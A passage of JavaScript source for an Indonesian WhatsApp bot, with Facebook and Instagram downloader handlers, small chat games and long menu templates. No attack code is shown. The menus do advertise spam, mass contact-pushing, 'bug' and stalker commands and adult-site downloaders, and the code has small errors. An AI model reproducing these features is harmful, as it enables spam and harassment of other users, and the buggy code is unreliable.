           if (!args[0]) {
    return replygcyuta(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygcyuta('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    Yuta.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replygcyuta('Maybe private video!')
  }
  }
  break
case 'instagram': case 'ig': case 'igvideo': {
if (!users.registered) return IsReg() 
if (!text.includes('www.instagram.com/reel/')) return replygcyuta(`• *Example :* .${command} https://www.instagram.com/reel/xxxxxxx`)
if (limituser < 1) return limitAbis();
useLimit(1)
await LoadingReact()
replygcyuta(mess.loading)
await LoadingReact()
try {
let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
let msgs = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
  "messageContextInfo": {
  "deviceListMetadata": {},
  "deviceListMetadataVersion": 2
  },
  interactiveMessage: proto.Message.InteractiveMessage.create({
  body: proto.Message.InteractiveMessage.Body.create({
  text: `Done *[ Downloader Ig ]*`
  }),
  footer: proto.Message.InteractiveMessage.Footer.create({
  text: botname
  }),
  header: proto.Message.InteractiveMessage.Header.create({
  hasMediaAttachment: false,
  ...await prepareWAMessageMedia({video: {url: gtAu.url}}, { upload: Yuta.waUploadToServer })
  }),
  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
  buttons: [{
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Audio🎧","id":"${xprefix}igmusic ${text}"}`
  }],
  }),
  contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
  forwardedNewsletterMessageInfo: {
  newsletterJid: jidch,
  newsletterName: ownername,
  serverMessageId: 143
 }
 }
 })
 }
 }
}, { quoted: fnews })
await Yuta.relayMessage(m.chat, msgs.message, {})
} catch (e) {
 replygcyuta(`maaf kak error result\n\n${e}`)
}

}
break

case 'igimage': case 'igfoto': case 'igft': {
if (!users.registered) return IsReg() 
if (!text.includes('www.instagram.com/p/')) return replygcyuta(`• *Example :* .${command} https://www.instagram.com/p/xxxxxxx`)
if (limituser < 1) return limitAbis();
useLimit(1)
try {
let hasil = await fetchJson("https://apikita.exonity.xyz/api/igdl?url=" + text)
let get = hasil.result.media
let no = 1
for (let i of get) {
Yuta.sendMessage(m.sender, {image: {url: i}, caption: `Gambar ke - ${no++}`}, {quoted: m})
}
} catch (e) {
replygcyuta(`Tidak Dapat Mendownload Foto Nya`)
}}
break

case 'igmusic': case 'instagramusic': {
if (!users.registered) return IsReg() 
if (!text.includes('www.instagram.com/reel/')) return replygcyuta(`• *Example :* .${command} https://www.instagram.com/reel/xxxxxxx`)
if (limituser < 1) return limitAbis();
useLimit(1)
await LoadingReact()
replygcyuta(mess.loading)
await LoadingReact()

try {
  let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,"isAudioOnly":"true"}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
  await Yuta.sendMessage(from, {audio: {url: gtAu.url}, mimetype: 'audio/mp4', ptt: false}, {quoted: fnews})
} catch (e) {
  replygcyuta('Tidak dapat mendownload audio')
}

}
break
			// Fun Menu
			case 'dice': {
				let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 },{ url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 },{ url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 },{ url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 },{ url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 },{ url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
				let media = pickRandom(ddsa)
				await Yuta.sendImageAsSticker(m.chat, media.url, m, { packname: global.packname, author: global.author, isAvatar: 1 })
			}
			break
			
			// Game Menu
			case 'slot': {
				await gameSlot(Yuta, m, global.db.data.users)
			}
			break
			case 'casino': {
				await gameCasinoSolo(Yuta, m, prefix, global.db.data.users)
			}
			break
			case 'robber': case 'rob': {
				await gameMerampok(m, global.db.data.users)
			}
			break
			case 'suitpvp': case 'suit': {
				let poin = 10
				let poin_lose = 10
				let timeout = 60000
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcyuta(`Finish your previous suit`)
				if (m.mentionedJid[0] === m.sender) return replygcyuta(`Can't play with myself !`)
				if (!m.mentionedJid[0]) return replygcyuta(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[0]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcyuta(`The person you are challenging is playing suit with someone else :(`)
				let id = 'suit_' + new Date() * 1
				let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} challenge @${m.mentionedJid[0].split`@`[0]} to play suits\n\nPlease @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
				game.suit[id] = {
					chat: replygcyuta(caption),
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					waktu: setTimeout(() => {
						if (game.suit[id]) replygcyuta(`_Suit time is up_`)
						delete game.suit[id]
					}, 60000), poin, poin_lose, timeout
				}
			}
			break
			case 'ttc': case 'ttt': case 'tictactoe': {
				let TicTacToe = require('./lib/tictactoe');
				if (Object.values(game.tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcyuta(`You are still in the game!\nType *${prefix}del${command}* If you want to end the session`);
				let room = Object.values(game.tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
				if (room) {
					replygcyuta('Partner found!')
					room.o = m.chat
					room.game.playerO = m.sender
					room.state = 'PLAYING'
					let arr = room.game.render().map(v => {
						return {X: '❌',O: '⭕',1: '1️⃣',2: '2️⃣',3: '3️⃣',4: '4️⃣',5: '5️⃣',6: '6️⃣',7: '7️⃣',8: '8️⃣',9: '9️⃣'}[v]
					})
					let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nWaiting @${room.game.currentTurn.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
					if (room.x !== room.o) await Yuta.sendMessage(room.x, { texr: str, mentions: parseMention(str) }, { quoted: m })
					await Yuta.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
				} else {
					room = {
						id: 'tictactoe-' + (+new Date),
						x: m.chat,
						o: '',
						game: new TicTacToe(m.sender, 'o'),
						state: 'WAITING',
						waktu: setTimeout(() => {
							if (game.tictactoe[roomnya.id]) replygcyuta(`_Time ${command} finished_`)
							delete game.tictactoe[roomnya.id]
						}, 300000)
					}
					if (text) room.name = text
					Yuta.sendMessage(m.chat, { text: 'Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''), mentions: m.mentionedJid }, { quoted: m })
					game.tictactoe[room.id] = room
				}
			}
			break
			case 'playbomb': case 'bomb': {
				if (game.tebakbom[m.sender]) return replygcyuta('There Are Still Unfinished Sessions!')
				function shuffle(array) {
					return array.sort(() => Math.random() - 0.5);
				}
				game.tebakbom[m.sender] = {
					petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
					waktu: setTimeout(() => {
						if (game.tebakbom[m.sender]) replygcyuta(`_Time ${command} finished_`)
						delete game.tebakbom[m.sender];
					}, 120000)
				}
				replygcyuta(`*GUESS THE BOMB*\n\n${game.tebakbom[m.sender].board.join("")}\n\nChoose that number! and don't get hit by a bomb!\nBomb : ${game.tebakbom[m.sender].bomb}\nLife : ${game.tebakbom[m.sender].nyawa.join("")}`);
			}
			break
			case 'mathquiz': case 'math': {
				const { genMath, modes } = require('./lib/math');
				const inputMode = ['noob', 'easy', 'medium', 'hard','extreme','impossible','impossible2'];
				if (!text) return replygcyuta(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
				if (!inputMode.includes(text.toLowerCase())) return replygcyuta('Mode not found!')
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) return replygcyuta('There Are Still Unfinished Sessions!')
				let result = await genMath(text.toLowerCase())
				replygcyuta(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} detik`).then(() => {
					game.kuismath[m.sender.split('@')[0]] = {
						jawaban: result.jawaban,
						mode: text.toLowerCase()
					}
				})
				await sleep(result.waktu)
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) {
					replygcyuta('Time has run out\nAnswer: ' + game.kuismath[m.sender.split('@')[0]].jawaban)
					delete game.kuismath[m.sender.split('@')[0]]
				}
			}
			break
			
			// Menu
case 'menu': case 'help': case 'yutabtz': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

エラーがある場合は .owner に報告できます はい`

menuv(xmenu_oh)
}
break

case 'topmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ᴛᴏᴘ ᴍᴇɴᴜ ]* ----
╠⪼ .ᴘʟᴀʏ %100
╠⪼ .ᴘʟᴀʏᴍs %100
╠⪼ .ʏᴛᴍᴘ3 %100
╠⪼ .ʏᴛᴍᴘ4 %100
╠⪼ .ᴢᴇʀᴏ %50 ʙᴜʀɪᴋ ɢᴀᴍʙᴀʀ ɴʏᴀ
╚----------------

エラーがある場合は .owner に報告できます はい`

menuv(xmenu_oh)
}
break

case 'listmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`MENU\` ]┄┄┄┄
${setv} ${prefix}allmenu
${setv} ${prefix}topmenu
${setv} ${prefix}searchmenu
${setv} ${prefix}downloadmenu
${setv} ${prefix}gamemenu
${setv} ${prefix}funmenu
${setv} ${prefix}aimenu
${setv} ${prefix}groupmenu
${setv} ${prefix}owner
${setv} ${prefix}infoditz
${setv} ${prefix}infobot
${setv} ${prefix}infoownermenu
${setv} ${prefix}islamimenu
${setv} ${prefix}listmenulain
${setv} ${prefix}religionmenu
${setv} ${prefix}animemenu
${setv} ${prefix}nsfwmenu
${setv} ${prefix}randomphotomenu
${setv} ${prefix}randomvideomenu
${setv} ${prefix}sticker
${setv} ${prefix}qcmenu
${setv} ${prefix}databasemenu
${setv} ${prefix}storemenu
${setv} ${prefix}stalkermenu
${setv} ${prefix}bugmenu
${setv} ${prefix}quotesmenu
${setv} ${prefix}servermcmenu
${setv} ${prefix}othermenu
╰──────❍

エラーがある場合は .owner に報告できます はい`
menuv(xmenu_oh)
}
break
case 'allmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

エラーがある場合は .owner に報告できます はい

╔┄┄┄┄ [ \`Owner\` ] ┄┄┄┄
${setv} ${prefix}addbadword
${setv} ${prefix}delbadword
${setv} ${prefix}autoread
${setv} ${prefix}autobio
${setv} ${prefix}autotype
${setv} ${prefix}pushch
${setv} ${prefix}pushchvn
${setv} ${prefix}pushgc
${setv} ${prefix}pushstickergc
${setv} ${prefix}autorecord
${setv} ${prefix}autorecordtype
${setv} ${prefix}autoswview
${setv} ${prefix}setautoblock
${setv} ${prefix}setantiforeign
${setv} ${prefix}autoblock
${setv} ${prefix}onlygc
${setv} ${prefix}onlypc
${setv} ${prefix}onlyindia
${setv} ${prefix}onlyindo
${setv} ${prefix}anticall
${setv} ${prefix}self
${setv} ${prefix}public
${setv} ${prefix}join
${setv} ${prefix}poll
${setv} ${prefix}spam
${setv} ${prefix}bc
${setv} ${prefix}bcgroup
${setv} ${prefix}setimgmenul
${setv} ${prefix}setvidmenu
${setv} ${prefix}setgifmenu
${setv} ${prefix}setreply
${setv} ${prefix}resethit
${setv} ${prefix}resetuser
${setv} ${prefix}creategc
${setv} ${prefix}setexif
${setv} ${prefix}getexif
${setv} ${prefix}getautoblocknumber
${setv} ${prefix}getantiforeignnumber
${setv} ${prefix}userjid
${setv} ${prefix}setbotbio
${setv} ${prefix}delppbot
${setv} ${prefix}shutdown
${setv} ${prefix}setppbot
${setv} ${prefix}addprem
${setv} ${prefix}delprem
${setv} ${prefix}addowner
${setv} ${prefix}delowner
${setv} ${prefix}addvn
${setv} ${prefix}addapk
${setv} ${prefix}addzip
${setv} ${prefix}addpdf
${setv} ${prefix}delapk
${setv} ${prefix}delzip
${setv} ${prefix}delpdfl
${setv} ${prefix}delvnl
${setv} ${prefix}addsticker
${setv} ${prefix}delsticker
${setv} ${prefix}addimage
${setv} ${prefix}delimage
${setv} ${prefix}addvideo
${setv} ${prefix}delvideo
${setv} ${prefix}upswtext
${setv} ${prefix}upswvideo
${setv} ${prefix}upswimage
${setv} ${prefix}upswaudio
${setv} ${prefix}autosticker
${setv} ${prefix}block
${setv} ${prefix}unblock
${setv} ${prefix}leavegc
${setv} ${prefix}pushcontact
${setv} ${prefix}pushcontactv2
${setv} ${prefix}pushcontactv3
${setv} ${prefix}jpm
${setv} ${prefix}checkmember
${setv} ${prefix}post
${setv} ${prefix}clearchat
${setv} ${prefix}setprefix
╰─┬────❍
╔┄┄┄┄[ \`Owner\` ]┄┄┄┄
${setv} ${prefix}kisahnabi
${setv} ${prefix}asmaulhusna
${setv} ${prefix}bacaansholat
${setv} ${prefix}audiosurah
${setv} ${prefix}ayatkursi
${setv} ${prefix}pushch
${setv} ${prefix}pushchvn
${setv} ${prefix}pushgc
${setv} ${prefix}pushstickergc
${setv} ${prefix}doaharian
${setv} ${prefix}niatsholat
${setv} ${prefix}quotesislami
${setv} ${prefix}doatahlil
╰─┬────❍
╔┄┄┄┄[ \`Server Mc\` ]┄┄┄┄
${setv} ${prefix}mc
${setv} ${prefix}server
${setv} ${prefix}hyperxzbedrock
${setv} ${prefix}hyperxzjava
╰──────❍
╔┄┄┄┄[ \`Quotes\` ]┄┄┄┄
${setv} ${prefix}quotesanime
${setv} ${prefix}quotesbucin
${setv} ${prefix}quotesbacot
${setv} ${prefix}quotesgalau
${setv} ${prefix}quotesgombal
${setv} ${prefix}quoteshacker
╰──────❍
╔┄┄┄┄[ \`islami\` ]┄┄┄┄
${setv} ${prefix}kisahnabi
${setv} ${prefix}asmaulhusna
${setv} ${prefix}bacaansholat
${setv} ${prefix}audiosurah
${setv} ${prefix}islamiai
${setv} ${prefix}islamal
${setv} ${prefix}doaharian
${setv} ${prefix}niatsholat
${setv} ${prefix}rentbot
${setv} ${prefix}quotesislami
${setv} ${prefix}doatahlil
╰──────❍
╔┄┄┄┄[ \`Group\` ]┄┄┄┄
${setv} ${prefix}antibot
${setv} ${prefix}antiviewonce
${setv} ${prefix}readviewonce
${setv} ${prefix}welcome
${setv} ${prefix}adminevent
${setv} ${prefix}groupevent
${setv} ${prefix}antiforeign
${setv} ${prefix}antimedia
${setv} ${prefix}antiaudio
${setv} ${prefix}antivideo
${setv} ${prefix}antiimage
${setv} ${prefix}antidocument
${setv} ${prefix}antilocation
${setv} ${prefix}anticontact
${setv} ${prefix}antisticker
${setv} ${prefix}antipoll
${setv} ${prefix}antilink
${setv} ${prefix}antilinkgc
${setv} ${prefix}antilinkch
${setv} ${prefix}antilinknumber
${setv} ${prefix}antipromotion
${setv} ${prefix}antivirtex
${setv} ${prefix}grouplink
${setv} ${prefix}listadmin
${setv} ${prefix}invite
${setv} ${prefix}ephemeral
${setv} ${prefix}delete
${setv} ${prefix}setppgroup
${setv} ${prefix}delppgroup
${setv} ${prefix}setnamegc
${setv} ${prefix}setdesc
${setv} ${prefix}add
${setv} ${prefix}kick
${setv} ${prefix}promote
${setv} ${prefix}demote
${setv} ${prefix}kickall
${setv} ${prefix}promoteall
${setv} ${prefix}demoteall
${setv} ${prefix}getcontact
${setv} ${prefix}savecontact
${setv} ${prefix}sendcontact
${setv} ${prefix}contactag
${setv} ${prefix}hidetag
${setv} ${prefix}totag
${setv} ${prefix}tagall
${setv} ${prefix}editinfo
${setv} ${prefix}opentime
${setv} ${prefix}closetime
${setv} ${prefix}resetlink
${setv} ${prefix}getbio
${setv} ${prefix}vote
${setv} ${prefix}upvote
${setv} ${prefix}downvote
${setv} ${prefix}checkvote
${setv} ${prefix}delvote
${setv} ${prefix}antivirus
${setv} ${prefix}antibadword
${setv} ${prefix}nsfw
${setv} ${prefix}react
${setv} ${prefix}getjoinrequest
╰─┬────❍
╔┄┄┄┄[ \`Search\` ]┄┄┄┄
${setv} ${prefix}google
${setv} ${prefix}wikipedia
${setv} ${prefix}ytsearch
${setv} ${prefix}xnxxsearch
${setv} ${prefix}xvideosearch
${setv} ${prefix}apksearch
${setv} ${prefix}sticker
${setv} ${prefix}qcsearch
${setv} ${prefix}imdb
${setv} ${prefix}wanumber
${setv} ${prefix}friend
${setv} ${prefix}lyrics
${setv} ${prefix}pixiv
╰─┬────❍
╔┄┄┄┄[ \`Download\` ]┄┄┄┄
${setv} ${prefix}xnxxdl
${setv} ${prefix}xvideodl
${setv} ${prefix}splay
${setv} ${prefix}itunes
${setv} ${prefix}play
${setv} ${prefix}ytmp3
${setv} ${prefix}ytmp4
${setv} ${prefix}tiktok
${setv} ${prefix}ttslide
${setv} ${prefix}tiktokaudio
${setv} ${prefix}tiktokvideo
${setv} ${prefix}igvideo
${setv} ${prefix}igmusic
${setv} ${prefix}igimage
${setv} ${prefix}igfoto
${setv} ${prefix}igft
${setv} ${prefix}facebook
${setv} ${prefix}twitter
${setv} ${prefix}apk
${setv} ${prefix}mega
${setv} ${prefix}mediafire
${setv} ${prefix}google
${setv} ${prefix}gimage
${setv} ${prefix}weather
${setv} ${prefix}spotify
${setv} ${prefix}gitclone
${setv} ${prefix}happymod
${setv} ${prefix}gdrive
${setv} ${prefix}pinterest
${setv} ${prefix}zerochan
${setv} ${prefix}infoanime
${setv} ${prefix}ringtone
${setv} ${prefix}autodownload
╰──────❍
╔┄┄┄┄[ \`Tool Menu\` ]┄┄┄┄
${setv} ${prefix}obfuscate
${setv} ${prefix}styletext
${setv} ${prefix}fliptext
${setv} ${prefix}tts
${setv} ${prefix}say
${setv} ${prefix}togif
${setv} ${prefix}toqr
${setv} ${prefix}bass
${setv} ${prefix}blown
${setv} ${prefix}deep
${setv} ${prefix}earrape
${setv} ${prefix}fast
${setv} ${prefix}fat
${setv} ${prefix}nightcore
${setv} ${prefix}reverse
${setv} ${prefix}robot
${setv} ${prefix}slow
${setv} ${prefix}smooth
${setv} ${prefix}squirrel
${setv} ${prefix}tinyurl
${setv} ${prefix}tovn
${setv} ${prefix}t
${setv} ${prefix}toaudio
${setv} ${prefix}tomp3
${setv} ${prefix}tomp4
${setv} ${prefix}toimg
${setv} ${prefix}toonce
${setv} ${prefix}toptv
${setv} ${prefix}sticker
${setv} ${prefix}qc
${setv} ${prefix}smeme
${setv} ${prefix}smeta
${setv} ${prefix}take
${setv} ${prefix}emojimix
${setv} ${prefix}volaudio
${setv} ${prefix}volvideo
${setv} ${prefix}ebinary
${setv} ${prefix}dbinary
${setv} ${prefix}ssweb
${setv} ${prefix}quoted
${setv} ${prefix}translate
${setv} ${prefix}get
${setv} ${prefix}tourl
${setv} ${prefix}write
╰─┬────❍
╔┄┄┄┄[ \`List Menu\` ]┄┄┄┄
${setv} ${prefix}listprem
${setv} ${prefix}listowner
${setv} ${prefix}liststicker
${setv} ${prefix}listimage
${setv} ${prefix}listvideo
${setv} ${prefix}listvn
${setv} ${prefix}listapk
${setv} ${prefix}listzip
${setv} ${prefix}listpdf
${setv} ${prefix}listbadword
${setv} ${prefix}listpc
${setv} ${prefix}listgc
╰─┬────❍
╔┄┄┄┄[ \`Random Photo\` ]┄┄┄┄
${setv} ${prefix}aesthetic
${setv} ${prefix}coffee
${setv} ${prefix}wikimedia
${setv} ${prefix}wallpaper
${setv} ${prefix}art
${setv} ${prefix}bts
${setv} ${prefix}dogwoof
${setv} ${prefix}catmeow
${setv} ${prefix}lizardpic
${setv} ${prefix}goosebird
${setv} ${prefix}8ballpool
${setv} ${prefix}cosplay
${setv} ${prefix}hacker
${setv} ${prefix}cyber
${setv} ${prefix}gamewallpaper
${setv} ${prefix}islamic
${setv} ${prefix}jennie
${setv} ${prefix}jiso
${setv} ${prefix}satanic
${setv} ${prefix}justina
${setv} ${prefix}cartoon
${setv} ${prefix}pentol
${setv} ${prefix}cat
${setv} ${prefix}kpop
${setv} ${prefix}exo
${setv} ${prefix}lisa
${setv} ${prefix}space
${setv} ${prefix}car
${setv} ${prefix}technology
${setv} ${prefix}bike
${setv} ${prefix}shortquote
${setv} ${prefix}antiwork
${setv} ${prefix}hacking
${setv} ${prefix}boneka
${setv} ${prefix}rose
${setv} ${prefix}ryujin
${setv} ${prefix}ulzzangboy
${setv} ${prefix}ulzzanggirl
${setv} ${prefix}wallml
${setv} ${prefix}wallphone
${setv} ${prefix}mountain
${setv} ${prefix}goose
${setv} ${prefix}profilepic
${setv} ${prefix}couplepp
${setv} ${prefix}programming
${setv} ${prefix}pubg
${setv} ${prefix}blackpink
${setv} ${prefix}randomboy  
${setv} ${prefix}randomgirl
${setv} ${prefix}hijab  
${setv} ${prefix}chinese
${setv} ${prefix}indo
${setv} ${prefix}japanese
${setv} ${prefix}korean
${setv} ${prefix}malay
${setv} ${prefix}thai
${setv} ${prefix}vietnamese
╰─┬────❍
╔┄┄┄┄[ \`Random Video\` ]┄┄┄┄
${setv} ${prefix}tiktokgirl
${setv} ${prefix}tiktoknukthy
${setv} ${prefix}tiktokkayes
${setv} ${prefix}tiktokpanrika
${setv} ${prefix}tiktoknotnot
${setv} ${prefix}tiktokghea
